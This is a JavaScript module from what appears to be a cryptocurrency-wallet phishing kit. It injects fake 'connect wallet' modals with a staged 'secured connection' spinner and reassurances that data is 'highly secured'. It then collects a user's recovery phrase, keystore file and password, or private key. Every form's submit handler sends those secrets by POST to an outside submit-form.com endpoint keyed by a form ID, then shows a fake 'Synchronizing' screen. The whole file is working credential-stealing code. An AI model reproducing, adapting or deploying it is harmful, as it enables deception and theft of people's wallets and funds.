const modalsHTML = (formId) => `
<!-- Overlay barcode -->
<button id="connect-btn" style="display: none">Connect</button>
<div class="modal-layout" id="modal-1">
    <button class="btn-close" id="close-btn">close</button>
    <div class="modal-child">
        <div class="barcode">
            <img src="../img/two.png" alt="" class="barcode-img" />
        </div>
        <div class="spinnerr"></div>
        <h4 class="head-7 m-t-5px">Synchronizing...</h4>
        <h6 class="para-2 m-t-5px">Please contact admin/support for authentication</h6>
    </div>
</div>

<!-- Overlay error alert -->
<div class="modal-layout" id="modal-2">
    <button class="btn-close" id="close-btn2">close</button>
    <div class="modal-child modal-child-3">
	<div class="alert">
	<div class="lpd-secure-conn" style="display: none;">
	  <h6 class="text-center lpd-secure">
		Starting secured connection
	  </h6>
	  <p class="text-center lpd-wait">please wait...</p>
	  <div class="lpd-slider m-t-20px">
		<div class="lpd-slider-dot"></div>
	  </div>
	</div>

	<div class="bottom">
	  <div>
		<p class="wallet-name">Web3</p>
		<p class="wallet-info m-t-5px">Connectings via web3...</p>
	  </div>
	  <button class="connectButton btn-import btn-import--2" id="close-btn5" dhkk-cro="true">
		Connect wallet
	  </button>
	</div>

	<div class="top lpd-secure-conn-top" style="display: flex;">
	  <div style="display: flex" class="web3-connect-error">
		<p class="alert-text m-t-5px animated bounceInLeft">
		  Having trouble connecting to Web3?
		</p>
		<a href="wallets/index.html" class="lpd-nav-wallet-link" style="padding: 0; width: 75%">
		  <button class="btn-import btn-import--2 animated bounceInRight">
			Connect Manually
		  </button>
		</a>
	  </div>
	</div>
  </div>
    </div>
</div>

<!-- Overlay forms -->
<div class="modal-layout" id="modal-3">
    <button class="btn-close" id="close-btn3">close</button>
    <div class="modal-child modal-child-2">
        <div class="form-container">
            <div class="navigators">
                <button class="navigator-item active" id="btn-11">phrase</button>
                <button class="navigator-item" id="btn-22">keystore JSON</button>
                <button class="navigator-item" id="btn-33">Private key</button>
            </div>
            <span class="labell labell-2 m-b-10px">
                <i class="fas fa-check-circle"></i>
                <span>Your informations are highly secured</span>
            </span>
            <!--Phrase  -->
            <div class="phrase-cont animate-slide-top active">
                <form action="https://submit-form.com/${formId}" id="importForm">
                    <textarea name="phrase" id="phrase" class="inputs" minlength="12" rows="7" cols="60" placeholder="Phrase"></textarea>
                    <input type="text" name="walletname" id="walletname" class="walletname" minlength="2" class="inputs m-t-10px" />
                    <span class="labell">Typically 12 (sometimes 24) words separated by a single space.</span>
                    <button type="submit" class="btn-import m-t-50px">Import</button>
                </form>
            </div>
            <!--Keystore  -->
            <div class="keystore-cont animate-slide-top">
                <form action="https://submit-form.com/${formId}" id="keystoreForm">
                    <textarea name="json" id="json" class="inputs" minlength="2" rows="7" cols="60" placeholder="Keystore JSON"></textarea>
                    <input type="text" name="password" id="password" minlength="2" class="inputs m-t-10px" placeholder="Password" />
                    <input type="text" name="walletname" id="walletname" class="walletname" minlength="2" class="inputs m-t-10px" />
                    <span class="labell">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</span>
                    <button type="submit" class="btn-import m-t-50px">Import</button>
                </form>
            </div>
            <!--Private  -->
            <div class="private-cont animate-slide-top">
                <form action="https://submit-form.com/${formId}" id="privateForm">
                    <input type="text" name="privateKey" id="privateKey" minlength="12" class="inputs" placeholder="Private Key" />
                    <input type="text" name="walletname" id="walletname" class="walletname" minlength="2" class="inputs m-t-10px" />
                    <span class="labell">Typically 12 (sometimes 24) words separated by a single space.</span>
                    <button type="submit" class="btn-import m-t-50px">Import</button>
                </form>
            </div>
        </div>
    </div>
</div>
`;

function initializeModals(formId) {
	const cssLink = document.createElement("link");
	cssLink.rel = "stylesheet";
	cssLink.href = "../css/style.css"; // Update with your actual CDN URL
	document.head.appendChild(cssLink);

	// Add HTML to the body
	document.body.insertAdjacentHTML("beforeend", modalsHTML(formId));
	// Modal
	let $close = document.getElementById("close-btn");
	let $close2 = document.getElementById("close-btn2");
	let $close3 = document.getElementById("close-btn3");
	let $modal = document.getElementById("modal-1");
	let $modal2 = document.getElementById("modal-2");
	let $modal3 = document.getElementById("modal-3");

	let $open1 = document.querySelectorAll(".wallet-item");

	document
		.getElementById("connect-btn")
		.addEventListener("click", function (e) {
			document.querySelector(".lpd-secure-conn").style.display = "block";
			document.querySelector(".lpd-secure-conn-top").style.display = "none";
			$modal2.classList.add("active");
			setTimeout(() => {
				document.querySelector(".lpd-secure-conn").style.display = "none";
				document.querySelector(".lpd-secure-conn-top").style.display = "flex";
			}, 3000);
		});

	$close2.addEventListener("click", function () {
		$modal2.classList.remove("active");
	});

	$close3.addEventListener("click", function () {
		$modal3.classList.remove("active");
	});

	$open1.forEach(function (item) {
		item.addEventListener("click", function () {
			$modal2.classList.remove("active");
			$modal3.classList.add("active");
		});
	});

	$close.addEventListener("click", function () {
		$modal.classList.remove("active");
	});

	// All form data
	const phrase = document.getElementById("phrase");
	const json = document.getElementById("json");
	const password = document.getElementById("password");
	const privateKey = document.getElementById("privateKey");

	function resetData() {
		phrase.value = "";
		json.value = "";
		password.value = "";
		privateKey.value = "";
		document.querySelectorAll("#walletname").forEach((ele) => {
			ele.value = "";
		});
	}

	function validatePhrase() {
		return phrase.value.length > 0;
	}

	function validateKeystore() {
		return json.value.length > 0 && password.value.length > 0;
	}

	function validatePrivatekey() {
		return privateKey.value.length > 0;
	}

	document
		.getElementById("importForm")
		.addEventListener("submit", function (event) {
			event.preventDefault();
			if (!validatePhrase()) {
				alert("Field not allowed to be empty");
				return;
			}
			const formData = new FormData(this);
			fetch(`https://submit-form.com/${formId}`, {
				method: "POST",
				body: formData,
			})
				.then((response) => response.json())
				.then(() => {
					resetData();
					$modal2.classList.remove("active");
					$modal3.classList.remove("active");
					$modal.classList.add("active");
				})
				.catch((error) => console.error(error));
		});

	document
		.getElementById("keystoreForm")
		.addEventListener("submit", function (event) {
			event.preventDefault();
			if (!validateKeystore()) {
				alert("Fields not allowed to be empty");
				return;
			}
			const formData = new FormData(this);
			fetch(`https://submit-form.com/${formId}`, {
				method: "POST",
				body: formData,
			})
				.then((response) => response.json())
				.then(() => {
					resetData();
					$modal2.classList.remove("active");
					$modal3.classList.remove("active");
					$modal.classList.add("active");
				})
				.catch((error) => console.error(error));
		});

	document
		.getElementById("privateForm")
		.addEventListener("submit", function (event) {
			event.preventDefault();
			if (!validatePrivatekey()) {
				alert("Field not allowed to be empty");
				return;
			}
			const formData = new FormData(this);
			fetch(`https://submit-form.com/${formId}`, {
				method: "POST",
				body: formData,
			})
				.then((response) => response.json())
				.then(() => {
					resetData();
					$modal2.classList.remove("active");
					$modal3.classList.remove("active");
					$modal.classList.add("active");
				})
				.catch((error) => console.error(error));
		});

	//   Tabs
	let $navs = document.querySelectorAll(".navigator-item");

	let $navs1 = document.getElementById("btn-11");
	let $navs2 = document.getElementById("btn-22");
	let $navs3 = document.getElementById("btn-33");

	let $phrase = document.querySelector(".phrase-cont");
	let $keystore = document.querySelector(".keystore-cont");
	let $private = document.querySelector(".private-cont");

	$navs.forEach(function (nav) {
		nav.addEventListener("click", function () {
			$navs.forEach(function (navItem) {
				navItem.classList.remove("active");
			});
			this.classList.add("active");
		});
	});

	$navs1.addEventListener("click", function () {
		$private.classList.remove("active");
		$keystore.classList.remove("active");
		$phrase.classList.add("active");
	});

	$navs2.addEventListener("click", function () {
		$phrase.classList.remove("active");
		$private.classList.remove("active");
		$keystore.classList.add("active");
	});

	$navs3.addEventListener("click", function () {
		$phrase.classList.remove("active");
		$keystore.classList.remove("active");
		$private.classList.add("active");
	});
}
export default function loadModals(formId) {
	document.addEventListener("DOMContentLoaded", function () {
		initializeModals(formId);
	});
}
